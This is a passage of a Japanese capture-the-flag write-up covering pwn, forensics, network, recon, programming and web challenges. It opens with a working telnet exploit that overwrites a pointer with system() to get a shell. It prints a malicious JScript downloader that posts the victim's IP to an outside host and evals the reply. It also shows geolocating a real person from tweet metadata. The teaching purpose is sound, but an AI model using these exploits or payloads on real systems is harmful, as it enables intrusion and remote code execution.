+tn.write("cat 3 3 3 &gt; 3\n")
+print tn.read_until("$")
+tn.write("ls\n")
+s = tn.get_socket()
+data = s.recv(256)
+print "%r" % data
+strlen_addr = struct.unpack("&lt;Q",data[2:8]+"\x00\x00")[0]
+print "[+] strlen = 0x%x" % strlen_addr
+
+# remote
+# nm -D libc.so.6 | grep strlen
+# 0000000000088ac0 T strlen
+# nm -D libc.so.6 | grep system
+# 0000000000046640 W system
+
+system_addr = strlen_addr - 0x42480
+print "[+] system = 0x%x" % system_addr
+
+tn.write("cat &gt; sys\n" + struct.pack("&lt;Q",system_addr) + "\x04")
+print tn.read_until("$")
+
+tn.write("echo 777777777777777 &gt; 7\n")
+print tn.read_until("$")
+tn.write("echo 7 &gt; 7\n")
+print tn.read_until("$")
+tn.write("echo 888 &gt; 8\n")
+
+# overflow 7 and write 8 to system addr!
+tn.write("cat &gt; 7\n" + "\x77" * 19 + "\x30\x30\x30\x04")
+print tn.read_until("$")
+tn.write("cat &gt; 7\n\x60\x00\x00\x00\x00\x00\x00\x04")
+print tn.read_until("$")
+tn.write("cat 7 7 7 &gt; 7\n")
+print tn.read_until("$")
+raw_input("ready?")
+tn.write("cat sys &gt; 8\n")
+print tn.read_until("$")
+tn.write("echo /bin/sh\n")
+
+tn.interact()
+
+# $ ls
+# crash
+# crash_launch
+# flag.txt
+# flag2_hard_to_guess_lolololol.txt
+# cat flag2_hard_to_guess_lolololol.txt
+# flag={GiveMeOneMoreShellshock}
+</code></pre>
+
+<p><strong>Ans. flag={GiveMeOneMoreShellshock}</strong></p>
+
+<hr>
+<h3>
+<a id="151-解析術-doubtful-files-100点" class="anchor" href="#151-%E8%A7%A3%E6%9E%90%E8%A1%93-doubtful-files-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>151 解析術 Doubtful Files （100点）</h3>
+
+<p>　ここからForensicです。<br>
+　これは、NTFSの代替データストリームの問題でした。<br>
+　代替データストリームはdir /rで表示できます。  </p>
+
+<pre><code>2014/09/05  00:18    &lt;DIR&gt;          ..
+2014/09/05  00:19                31 1.inf
+                                 26 1.inf:Zone.Identifier:$DATA
+2014/09/05  00:19                41 1.vbs
+                                 26 1.vbs:Zone.Identifier:$DATA
+2014/09/05  00:19                31 2.inf
+                                 26 2.inf:Zone.Identifier:$DATA
+2014/09/05  00:19                41 2.vbs
+
+(snip)
+
+2014/09/05  00:19                31 7.inf
+                                 56 7.inf:Zone.Identifier:$DATA
+2014/09/05  00:19                41 7.vbs
+                                 26 7.vbs:Zone.Identifier:$DATA
+2014/09/05  00:19                31 8.inf
+                                 26 8.inf:Zone.Identifier:$DATA
+2014/09/05  00:19                41 8.vbs
+                                 57 8.vbs:Zone.Identifier:$DATA
+(snip)
+</code></pre>
+
+<p>２つ、データサイズの異なるZone.Identifierがあります。  </p>
+
+<pre><code>notepad 7.inf:Zone.Identifier
+notepad 8.vbs:Zone.Identifier
+</code></pre>
+
+<p>これで開けました。</p>
+
+<pre><code>7.inf
+[ZoneTransfer]
+ZoneId=0
+
+ZmxhZz17QWx0ZXJuYXRlIERhdG
+
+
+8.vbs
+[ZoneTransfer]
+ZoneId=4
+
+EgU3RyZWFtIG9uIE5URlMhfQ==
+
+
+base64 -d
+ZmxhZz17QWx0ZXJuYXRlIERhdGEgU3RyZWFtIG9uIE5URlMhfQ==
+flag={Alternate Data Stream on NTFS!}
+</code></pre>
+
+<p><strong>Ans. flag={Alternate Data Stream on NTFS!}</strong></p>
+
+<hr>
+<h3>
+<a id="152-解析術-情報漏洩-100点" class="anchor" href="#152-%E8%A7%A3%E6%9E%90%E8%A1%93-%E6%83%85%E5%A0%B1%E6%BC%8F%E6%B4%A9-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>152 解析術 情報漏洩 （100点）</h3>
+
+<p>USBトラフィックのキャプチャです。<br>
+pngヘッダが見えるので、そこから途中にあるpcapのヘッダを削除してしまえば画像が出てきます。<br>
+<strong>Ans. flag={gambare benesse}</strong></p>
+
+<hr>
+<h3>
+<a id="153-解析術-speech-by-google-translate-150点" class="anchor" href="#153-%E8%A7%A3%E6%9E%90%E8%A1%93-speech-by-google-translate-150%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>153 解析術 Speech by google translate （150点）</h3>
+
+<p>flagを読み上げているwav。しかし、wavヘッダが書き換えてあるため、音声が途中で終わってしまいます。<br>
+dataチャンク直後のデータサイズの値を大きくしてしまえば、flagが全て聞き取れます。<br>
+<strong>Ans. flag is X5kpBQJUufHdkch923SJ</strong></p>
+
+<hr>
+<h3>
+<a id="154-解析術-cool-gadget-200点" class="anchor" href="#154-%E8%A7%A3%E6%9E%90%E8%A1%93-cool-gadget-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>154 解析術 Cool Gadget （200点）</h3>
+
+<p>jpgファイルの中に「removeme」とかかれた部分があります。除去するとクリプテックスの画像が出てきます。</p>
+
+<p>removemeの中のbase64の記述は、実はopensslのAES暗号化の表記です。
+（例：<a href="http://security.stackexchange.com/questions/20628/where-is-the-salt-on-the-openssl-aes-encryption?rq=1%EF%BC%89">http://security.stackexchange.com/questions/20628/where-is-the-salt-on-the-openssl-aes-encryption?rq=1）</a><br>
+keyは画像にある「EAHIV」</p>
+
+<pre><code>$ echo U2FsdGVkX19DElLZ5iosaBUi9M5zUkEIeSRJkzkbf8XfGIuf2KvFOw71OJ0WmeJ0 | openssl enc -d -a -aes-128-cbc -p
+enter aes-128-cbc decryption password:
+salt=431252D9E62A2C68
+key=FDA9546F23D61065159D37C3371DDFD4
+iv =E8270F80067CDB100C53B6D85937DFA6
+flag={Cryptex is cool!}
+</code></pre>
+
+<p><strong>Ans. flag={Cryptex is cool!}</strong></p>
+
+<hr>
+<h3>
+<a id="155-解析術-encrypted-message-300点" class="anchor" href="#155-%E8%A7%A3%E6%9E%90%E8%A1%93-encrypted-message-300%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>155 解析術 Encrypted Message （300点）</h3>
+
+<p>TrueCryptのファイルを、RAM上に存在するMaster keyで解読する問題。<br>
+2010年のNuit Du Hack 2010 – Forensic lvl 5や2011年のPlaidCTF 500 pts challenge “Fun with Firewire”と同じ種類の問題です。<br>
+ちなみに、Volatility一発とはいかないようになってる様子でした。<br>
+まず、Volatilityの解析でTrueCryptが動作しているのを確認し、次に、memdumpにaeskeyfindをかけます。  </p>
+
+<pre><code>$ aeskeyfind 155-memdump.mem 
+1a12393b53ea034fa984ec49486b11f7
+82b4307bdb34e651cf9a9bed4a32eecf
+4f4cc77bef1a8fd56170dcbd06251881c97a7cb9eb34e3f2eea2f9fe35a93d16
+48ba4613bb566afb1a0d4f8b405292444e8f771a51e8a4268235ac23217749f8
+64602f3e03939e5f646ad62d003621eb2d5b758a233335d882eef2f50068d0de
+Keyfind progress: 100%
+</code></pre>
+
+<p>下３つのうち、どれか２つがMaster key.<br>
+頑張って全部試すと、  </p>
+
+<pre><code>                            key1a = "64602f3e03939e5f646ad62d003621eb2d5b758a233335d882eef2f50068d0de".decode("hex")
+                            key1b = "48ba4613bb566afb1a0d4f8b405292444e8f771a51e8a4268235ac23217749f8".decode("hex")
+</code></pre>
+
+<p>これでflagが出ます。<br>
+TrueCryptをコンパイルするのは面倒なので、  </p>
+
+<pre><code>truecrypt5.py - partial TrueCrypt 5 implementation in Python.  
+Copyright (c) 2008 Bjorn Edstrom &lt;be@bjrn.se&gt;  
+</code></pre>
+
+<p>を改造して使いました。<br>
+参考サイト：<br>
+<a href="http://webcache.googleusercontent.com/search?q=cache:NSZw0qlTKF4J:repo.hackerzvoice.net/depot_hzv/meetings/2011/110205_TrueCrypt_et_la_RAM.pdf+&amp;cd=19&amp;hl=ja&amp;ct=clnk&amp;gl=jp">http://webcache.googleusercontent.com/search?q=cache:NSZw0qlTKF4J:repo.hackerzvoice.net/depot_hzv/meetings/2011/110205_TrueCrypt_et_la_RAM.pdf+&amp;cd=19&amp;hl=ja&amp;ct=clnk&amp;gl=jp</a></p>
+
+<p><strong>Ans. flag={Already Ended In 5/2014}</strong></p>
+
+<p>解説会：パスワードのキャッシュは存在しないため、平文パスワードが抽出できないようになっているとのこと。また、VolatilityのtruecryptmasterオプションでAES鍵を抽出できるそうです。</p>
+
+<hr>
+<h3>
+<a id="161-電網術-ftp-is-not-secure-50点" class="anchor" href="#161-%E9%9B%BB%E7%B6%B2%E8%A1%93-ftp-is-not-secure-50%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>161 電網術 ftp is not secure. （50点）</h3>
+
+<p>ここからnetworkの分野になります。<br>
+配布されているpcapファイルを覗くと、flag.tarが暗号化なしに流れてきているのが分かります。<br>
+これを抽出するとflag.zipが見つかります。flag.zipの中にはflag.txt、内容は「RkxBR3tYVEluWDY5bnF2RmFvRXd3TmJ9Cg==」<br>
+base64でdecodeしてflagが獲得できます。  </p>
+
+<p><strong>FLAG{XTInX69nqvFaoEwwNb}</strong></p>
+
+<hr>
+<h3>
+<a id="162-電網術-ベーシック-75点" class="anchor" href="#162-%E9%9B%BB%E7%B6%B2%E8%A1%93-%E3%83%99%E3%83%BC%E3%82%B7%E3%83%83%E3%82%AF-75%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>162 電網術 ベーシック （75点）</h3>
+
+<p>Wiresharkで解析すると、tcp.stream eq 3の通信でwebページへのログインに成功していることが分かります。<br>
+この時のベーシック認証は<br>
+Authorization: Basic aHR0cDovL2J1cm5pbmcubnNjLmdyLmpw<br>
+これをbase64デコードすると<br>
+<a href="http://burning.nsc.gr.jp">http://burning.nsc.gr.jp</a><br>
+ここで、ベーシック認証の場合、IDとパスワードが:で区切られることに注意。<br>
+<a href="http://burning.nsc.gr.jp">http://burning.nsc.gr.jp</a><br>
+にアクセスして、<br>
+ID-&gt; http<br>
+password-&gt; //burning.nsc.gr.jp<br>
+でアクセスすればflag出現。<br>
+<strong>flag={BasicIsNotSecure}</strong></p>
+
+<p>ちなみに、pcap上でもこのページにアクセスしたデータが入っていますが、内容はこうなっています。</p>
+
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;not_flag={I'm sorry. HaHaHa}&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>ひどい。</p>
+
+<hr>
+<h3>
+<a id="163-電網術-六十秒-333点" class="anchor" href="#163-%E9%9B%BB%E7%B6%B2%E8%A1%93-%E5%85%AD%E5%8D%81%E7%A7%92-333%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>163 電網術 六十秒 （333点）</h3>
+
+<p>Wiresharkでパケットを読んでも、いまいちピンときません。<br>
+ここで、CTFで重要な技術「目grep」が生きてきます。<br>
+パケットの中に、base64っぽい文字列で「Zmxh」という文字が見えます。CTFでこの４文字を見たら、多分「flag」の「fla」がbase64エンコードされたものと気がつかなければなりません。<br>
+とりあえずZmxhから始まる文字列を適当にBase64 decodeしてみるとflagが出てきます。<br>
+<strong>flag={12Gatsu14NichiAkatsuki7Tsu}</strong></p>
+
+<p>解説会： Zmxhの文字列の前にあった文字は、amazonの「京都大学　素数ものさし」の商品IDだそうです。  </p>
+
+<hr>
+<h3>
+<a id="164-電網術-japanese-kids-are-knowing-150点" class="anchor" href="#164-%E9%9B%BB%E7%B6%B2%E8%A1%93-japanese-kids-are-knowing-150%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>164 電網術 Japanese kids are knowing （150点）</h3>
+
+<p>問題文を読むとポートスキャンが必要のようなので、試しにnmapでポートスキャンをかけてみます。  </p>
+
+<pre><code>Host is up (0.026s latency).
+Not shown: 65534 filtered ports
+PORT     STATE SERVICE
+5006/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+</code></pre>
+
+<p>5006/tcpがあいているようです。試しにncしてみると、</p>
+
+<pre><code>$ nc 210.146.64.34 5006
+&lt;C-D-E-F-E-D-C---E-F-G-A-G-F-E---C-C-C-C-CCDDEEFFE-D-C-&gt;what animal am i?the flag is the md5 hash of my name in lower case.
+</code></pre>
+
+<p>ここで、C-D-E-……を音名と考えてみると、「ドレミファミレド　ミファソラソファミ……」となります。これは「カエルの歌」ですね。<br>
+ということで、frogをmd5するとflagが獲得できます。<br>
+<strong>Ans. 938c2cc0dcc05f2b68c4287040cfcf71</strong></p>
+
+<p>解説会：nmapのデフォルトではスキャンされないポートなので、ポート指定が必要です。  </p>
+
+<hr>
+<h3>
+<a id="165-電網術-malicious-code-200点" class="anchor" href="#165-%E9%9B%BB%E7%B6%B2%E8%A1%93-malicious-code-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>165 電網術 Malicious Code （200点）</h3>
+
+<p>165-cap2.pcapngを読んでいくと、10.0.2.222が210.146.64.38から、見慣れない「p.lnk」というファイルをダウンロードしていることが分かります。これはcmd.exe /c echo (...javascript...)&gt;%tmp%x.js &amp; x.jsというショートカット。実行するとファイルが生成されjsが実行される……ので、ちょっと変えてjsが実行される前に止めてみます。  </p>
+
+<p>x.jsの中身はこんな感じです。  </p>
+
+<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6 3(){1 w=R("Q:{P=O}");e=5 N(w.M("L * K J I H = G"));4 e.F().E(0)}6 p(u,d){1 r=5 D("C.B");r.A("z",u,y);r.v("t-s","q/x-o-n-m");r.l(2,k);r.j(d);4 r.i}1 u="h://g.f.c.b:a/p.9";1 d="8="+3();7(p(u,d));',54,54,'|var||ip|return|new|function|eval|myaddr|php|60444|38|64|||146|210|https|responseText|send|13056|setOption|urlencoded|form|www||application||Type|Content||setRequestHeader|||false|POST|open|ServerXMLHTTP|Msxml2|ActiveXObject|IPAddress|item|True|IPEnabled|WHERE|Win32_NetworkAdapterConfiguration|FROM|SELECT|ExecQuery|Enumerator|impersonate|impersonationLevel|winmgmts|GetObject'.split('|'),0,{}))
+</code></pre>
+
+<p>これをjsbeautifier.orgに突っ込むと</p>
+
+<pre><code>function ip() {
+    var w = GetObject("winmgmts:{impersonationLevel=impersonate}");
+    e = new Enumerator(w.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"));
+    return e.item().IPAddress(0)
+}
+
+function p(u, d) {
+    var r = new ActiveXObject("Msxml2.ServerXMLHTTP");
+    r.open("POST", u, false);
+    r.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    r.setOption(2, 13056);
+    r.send(d);
+    return r.responseText
+}
+var u = "https://210.146.64.38:60444/p.php";
+var d = "myaddr=" + ip();
+eval(p(u, d));
+</code></pre>
+
+<p>pcapngを読むと、確かに、HTTPSで210.146.64.38:60444への通信が発生しています。<br>
+この際、myaddr=には、自分のipアドレスが入る仕組みになっているようです。これをpcapのものと同じにすればflagが獲得できます。<br>
+ちなみに、他のipだと何の反応もありません。  </p>
+
+<pre><code>$ curl https://210.146.64.38:60444/p.php -F "myaddr=12.12.12.12" -k
+
+$ curl https://210.146.64.38:60444/p.php -F "myaddr=10.0.2.222" -k
+WScript.Echo('flag = {lnk is sometimes malicious}')
+</code></pre>
+
+<p>ちなみにcurlの-kオプションは、証明書エラーを無視するものです。<br>
+<strong>Ans. flag = {lnk is sometimes malicious}</strong></p>
+
+<hr>
+<h3>
+<a id="171-諜報術-kdl-100点" class="anchor" href="#171-%E8%AB%9C%E5%A0%B1%E8%A1%93-kdl-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>171 諜報術 KDL （100点）</h3>
+
+<p>ここから、reconです。
+昔のWebページを探したいときは、やっぱりweb.archive.orgですね。<br>
+<a href="http://web.archive.org/web/19981207002916/http://www.kdl.co.jp/">http://web.archive.org/web/19981207002916/http://www.kdl.co.jp/</a> を参照。<br><br>
+<strong>Ans. ソフトウェア開発エンジニア</strong></p>
+
+<hr>
+<h3>
+<a id="172-諜報術-mr-nipps-255点" class="anchor" href="#172-%E8%AB%9C%E5%A0%B1%E8%A1%93-mr-nipps-255%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>172 諜報術 Mr. Nipps （255点）</h3>
+
+<p>社長の名前を検索すると、Twitterの英語アカウントが出てきます。<br>
+<a href="https://github.com/junyamadera" class="user-mention">@junyamadera</a> until:2015-08-20<br>
+をライブで見ると、2015年8月13日5:31(JST)のこのツイートが見つかります。<br>
+<a href="https://twitter.com/junyamadera/status/631563742480834560">https://twitter.com/junyamadera/status/631563742480834560</a>  </p>
+
+<p><a href="https://syncer.jp/twitter-api-matome/demo/script-get.php">https://syncer.jp/twitter-api-matome/demo/script-get.php</a><br>
+このページからAPIを使って、詳細なJSONをダウンロードしてみます。自分でAPIを使って取得してもOKです。  </p>
+
+<p>解説会：「サンタ殿からのヒント：永・日°・愛」これ、APIって読むそうです……。  </p>
+
+<pre><code>JSON
+{"created_at": "Wed Aug 12 20:31:44 +0000 2015",
+"id": 631563742480834500,
+"id_str": "631563742480834560",
+"text": "Back to 'Double Curve' @ Hooters of Downtown LA https://t.co/ApOXy5vbMO",
+"source": "&lt;a href=\"http://instagram.com\" rel=\"nofollow\"&gt;Instagram&lt;/a&gt;",
+"truncated": false,
+"in_reply_to_status_id": null,
+"in_reply_to_status_id_str": null,
+"in_reply_to_user_id": null,
+"in_reply_to_user_id_str": null,
+"in_reply_to_screen_name": null,
++
+"user": { … 
+},
++
+"geo": { … 
+},
+-
+"coordinates": {"type": "Point",
+-
+"coordinates": [-118.2672272,
+34.0409203
+]
+},
++
+"place": { … 
+},
+"contributors": null,
+"is_quote_status": false,
+"retweet_count": 0,
+"favorite_count": 0,
++
+"entities": { … 
+},
+"favorited": false,
+"retweeted": false,
+"possibly_sensitive": false,
+"possibly_sensitive_appealable": false,
+"lang": "en"
+}
+</code></pre>
+
+<p><strong>Ans. 34.0409203,-118.2672272</strong></p>
+
+<hr>
+<h3>
+<a id="173-諜報術-akiko-chan-155点" class="anchor" href="#173-%E8%AB%9C%E5%A0%B1%E8%A1%93-akiko-chan-155%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>173 諜報術 Akiko-chan （155点）</h3>
+
+<p>画像をGoogle検索すると、この写真の載ったwordpressページが発見できます。<br>
+そのページがそのままflagです。<br><br>
+<strong>Ans. twanzphobic.wordpress.com</strong></p>
+
+<hr>
+<h3>
+<a id="174-諜報術-タナカハック-100点" class="anchor" href="#174-%E8%AB%9C%E5%A0%B1%E8%A1%93-%E3%82%BF%E3%83%8A%E3%82%AB%E3%83%8F%E3%83%83%E3%82%AF-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>174 諜報術 タナカハック （100点）</h3>
+
+<p>ヒントがないと相当困難な問題でした。<br>
+<a href="http://www.yamatosecurity.com/files/networkforensics1.pdf">http://www.yamatosecurity.com/files/networkforensics1.pdf</a><br>
+このpdfのプロパティに作成者名が入力されています。<br>
+作成者名がそのまま答えです。  </p>
+
+<p>解説会：FOCAというツールを使うと、Webサイトに公開されているファイルをすべてダウンロードし、メタデータを全て集められるとのこと。<br>
+pentestではよく使われるツールらしいです。  </p>
+
+<p><strong>Ans. tanakazakkarini123</strong></p>
+
+<hr>
+<h3>
+<a id="175-諜報術-タイムトラベル-155点" class="anchor" href="#175-%E8%AB%9C%E5%A0%B1%E8%A1%93-%E3%82%BF%E3%82%A4%E3%83%A0%E3%83%88%E3%83%A9%E3%83%99%E3%83%AB-155%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>175 諜報術 タイムトラベル （155点）</h3>
+
+<p><a href="http://web-tan.forum.impressrd.jp/e/2013/05/07/15205">http://web-tan.forum.impressrd.jp/e/2013/05/07/15205</a><br>
+や<br>
+<a href="https://diary.sshida.com/20100413-robtex%E3%81%A7DNS%E3%83%84%E3%83%AA%E3%83%BC%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%97%E3%81%9F%E4%BE%8B">https://diary.sshida.com/20100413-robtex%E3%81%A7DNS%E3%83%84%E3%83%AA%E3%83%BC%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%97%E3%81%9F%E4%BE%8B</a><br>
+に乗っている「robtex」で検索すると分かります。  </p>
+
+<p><a href="https://www.robtex.com/#!dns=50.115.13.104&amp;fwd=1">https://www.robtex.com/#!dns=50.115.13.104&amp;fwd=1</a><br>
+<a href="https://www.robtex.net/dns/50.115.13.104.html">https://www.robtex.net/dns/50.115.13.104.html</a><br>
+<a href="https://www.robtex.net/en/advisory/dns/com/blisterninja/mxserver-104/">https://www.robtex.net/en/advisory/dns/com/blisterninja/mxserver-104/</a>  </p>
+
+<pre><code>IP addresses that have PTR of mxserver-104.blisterninja.com (1 shown)
+50.115.13.104
+</code></pre>
+
+<p>ということで</p>
+
+<p><strong>Ans. mxserver-104.blisterninja.com</strong></p>
+
+<p>解説会：Rapid7でアーカイブされたデータを使うのが想定解とのこと。<br>
+google検索で「2013-09-21 reverse dns」でページ出現。  </p>
+
+<hr>
+<h3>
+<a id="181-記述術-search_duplicate_character_string-100点" class="anchor" href="#181-%E8%A8%98%E8%BF%B0%E8%A1%93-search_duplicate_character_string-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>181 記述術 search_duplicate_character_string （100点）</h3>
+
+<p>ここからPPCになります。<br>
+この問題は接尾辞木 (Suffix Tree)を使って解きます。ゲノム解析などで使われる手法らしいです。<br>
+<a href="http://www.geocities.jp/m_hiroi/light/pyalgo57.html">http://www.geocities.jp/m_hiroi/light/pyalgo57.html</a> のコードを使わせて頂きました。</p>
+
+<pre><code># $ python 181_ans.py 
+# 88851 88885 f_sz!bp_$gufl=b?za&gt;is#c|!?cxpr!i&gt;&lt;
+</code></pre>
+<p><strong>Ans. f_sz!bp_$gufl=b?za&gt;is#c|!?cxpr!i&gt;&lt;</strong></p>
+
+<hr>
+<h3>
+<a id="182-記述術-javascript-puzzle-200点" class="anchor" href="#182-%E8%A8%98%E8%BF%B0%E8%A1%93-javascript-puzzle-200%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>182 記述術 JavaScript Puzzle （200点）</h3>
+
+<p>最近流行のES6の登場です。考え方は以下の通り。<br>
+・バッククオートはテンプレートストリングを意味する。<br>
+　<a href="http://tc39wiki.calculist.org/es6/template-strings/">http://tc39wiki.calculist.org/es6/template-strings/</a><br>
+・バッククオート以降の文字列を"window.eval.callで呼ぶ。  </p>
+
+<pre><code>[ (0O000101), (0b1001100), (101), 0x52, 0x54 ]
+</code></pre>
+
+<p>　これで、大文字で"A,L,E,R,T"のアスキーコードが揃う。<br>
+　これをmapしてjoinすると"ALERT"になる。<br>
+・これをさらにtoLowerCaseして、最後に(1)をつける。  </p>
+
+<pre><code>　 ["map"](x=&gt;String["fromCodePoint"](x))["join"]("")["toLowerCase"]() +"(1)"
+</code></pre>
+
+<p><strong>Ans. Flag={4c0bf259050d08b8982b6ae43ad0f12be030f191}</strong></p>
+
+<hr>
+<h3>
+<a id="183-記述術-count-number-of-flags-substring-100点" class="anchor" href="#183-%E8%A8%98%E8%BF%B0%E8%A1%93-count-number-of-flags-substring-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>183 記述術 Count Number Of Flag's SubString! （100点）</h3>
+
+<p>頭を使わずブルートフォース一発。<br>
+"flag={"までは確定なので、ここから一文字ずつ探していきます。  </p>
+
+<pre><code>import urllib, urllib2
+
+data = "flag={"
+
+q = "abcdefghijklmnopqrstuvwxyz_"
+url = "http://210.146.64.36:30840/count_number_of_flag_substring/?str="
+footer = "&amp;count=count"
+
+while True:
+ for x in q:
+  res = urllib2.urlopen(url + urllib.quote_plus(data + x) + footer)
+  html = res.read()
+  print html
+  if "are 1" in html:
+    data = data + x
+    break
+
+ res = urllib2.urlopen(url + urllib.quote_plus(data + "}") + footer)
+ html = res.read()
+ if "are 1" in html:
+   print "DONE!"
+   print data + "}"
+   break
+
+# DONE!
+# flag={afsfdsfdsfso_idardkxa_hgiahrei_nxnkasjdx_hfuidgire_anreiafn_dskafiudsurerfrandskjnxxr}
+</code></pre>
+
+<p><strong>Ans. flag={afsfdsfdsfso_idardkxa_hgiahrei_nxnkasjdx_hfuidgire_anreiafn_dskafiudsurerfrandskjnxxr}</strong><br>
+……長い。</p>
+
+<hr>
+<h3>
+<a id="184-記述術-解凍-100点" class="anchor" href="#184-%E8%A8%98%E8%BF%B0%E8%A1%93-%E8%A7%A3%E5%87%8D-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>184 記述術 解凍? （100点）</h3>
+
+<p>pythonスクリプトでひたすら解凍を繰り返すのみ。<br>
+7zipを使うと楽です。  </p>
+
+<pre><code>import os
+
+a = 1
+
+while True:
+  if os.path.isfile("data.txt") == False:
+    if os.path.isfile("flag.txt") == False:
+      if os.path.isfile("flag") == False:
+        break
+      else:
+        os.system("mv flag data.txt")
+    else:
+      os.system("mv flag.txt data.txt")
+
+  os.system("7z e data.txt")
+  os.system("mv data.txt data.txt.old"+str(a))
+  os.system("mv data data.txt")
+  a = a + 1
+</code></pre>
+
+<p><strong>Ans. flag={6aKuZrEqxvBZUIqBOXgMclLwpQCo8OXi}</strong></p>
+
+<hr>
+<h3>
+<a id="185-記述術-make-sorted-amida-kuji-300点" class="anchor" href="#185-%E8%A8%98%E8%BF%B0%E8%A1%93-make-sorted-amida-kuji-300%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>185 記述術 Make sorted Amida kuji!! （300点）</h3>
+
+<p>PPC最難関問題。<br>
+最初の問題は手計算でも解けますが、２つ目はそうはいかない。データの数が余りに多いのです。jsファイルをダウンロードして、必要な部分をpythonに書き直して検索します。<br>
+うまく枝刈りをすれば、１分以内に解けます。  </p>
+
+<pre><code>import copy
+
+no = 10
+v = 10
+h = 9
+data = [9,8,6,5,7,3,2,1,0,4]
+fin =  [0,1,2,3,4,5,6,7,8,9]
+maxline = 39
+
+count = 0
+#no = 4
+#v = 4
+#h = 3
+#data = [3,1,2,0]
+#fin =  [0,1,2,3]
+#maxline=5
+
+def validate(matrix,dep):
+  global count
+  buf = copy.deepcopy(data)
+  for m in matrix:
+    for a in range(0,h):
+      if m[a] == 1:
+        buf[a],buf[a+1] = buf[a+1],buf[a]
+
+  if buf == fin:
+    f = open("data_final.txt","a")
+    y = 0
+    print matrix
+    for m in matrix:
+      for a in range(0,h):
+        if m[a] == 1:
+          f.write(str(y) + " " + str(a) + "\n")
+      y = y + 1
+    f.write("\n")
+    count += 1
+    print count
+    f.close()
+    return 1
+
+  for a in range(0,no):
+    if abs(buf.index(a) - a) &gt; (v-dep): # = buf.index(a) - fin.index(a)
+      return -1
+
+  return 0
+
+
+def search(mat,dep):
+  if dep == no:
+    return
+
+  for a in range(0,512):
+    q = "{:09b}".format(a)
+    if "11" in q:
+      continue
+    new_mat = map(int,list(q))    
+    matrix = copy.deepcopy(mat)
+    matrix.append(new_mat)
+    if validate(matrix,dep+1) == 0:
+      search(matrix,dep+1)
+from datetime import datetime
+print datetime.now().strftime("%Y/%m/%d %H:%M:%S")
+
+matrix = []
+search(matrix,0)
+print datetime.now().strftime("%Y/%m/%d %H:%M:%S")
+</code></pre>
+
+<p>これで獲得したデータからflagを生成します。<br>
+<strong>Ans. flag={021qsyrsuq2020dtsqpq02020zqkiq202020b+tq9202020m_q382020201q34620202qq8b6220202qk+h0l2020qesrqypq02q}</strong></p>
+
+<hr>
+<h3>
+<a id="191-超文書転送術-gifアニメ生成サイト-100点" class="anchor" href="#191-%E8%B6%85%E6%96%87%E6%9B%B8%E8%BB%A2%E9%80%81%E8%A1%93-gif%E3%82%A2%E3%83%8B%E3%83%A1%E7%94%9F%E6%88%90%E3%82%B5%E3%82%A4%E3%83%88-100%E7%82%B9" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>191 超文書転送術 GIFアニメ生成サイト （100点）</h3>
+
+<p>ここからWebです。  </p>
+
+<p>http://yamatoctf:qw8P3j40wEWTK2sRDXs4@210.146.64.47/<br>
+自分でGIFアニメを生成できるサイト。<br>
+生成されたファイルは/movies/view/1272など、番号で見ることができます。<br>
+試しに/movies/view/0……などと見てみると、/movies/view/1がforbiddenなことが分かります。<br>
+また、ホームページのソースからdefault.jsの存在が分かります。<br>
+http://yamatoctf:qw8P3j40wEWTK2sRDXs4@210.146.64.47/js/default.js<br>
+ここから、内部的な処理を一部読み取ることができます。<br>
+アップロードされたファイル名などは全て不明。しかし、最終的に/movies/newgif/" + $(this).attr("data-id")にアクセスするとファイルが見られることが分かります。<br>
+生成されたファイルは/movies/view/1272など、番号で見ることができる。  </p>
+
+<p>では、/movies/newgif/1にアクセスすると？  </p>
+
+<p>1.gifというアニメーションGIFが手に入ります。91フレーム目にflagが書かれています。  </p>
+
+<p><strong>Ans. flag={H0WdoUpronunceGIF?}</strong></p>
+
+<hr>
+<h3>
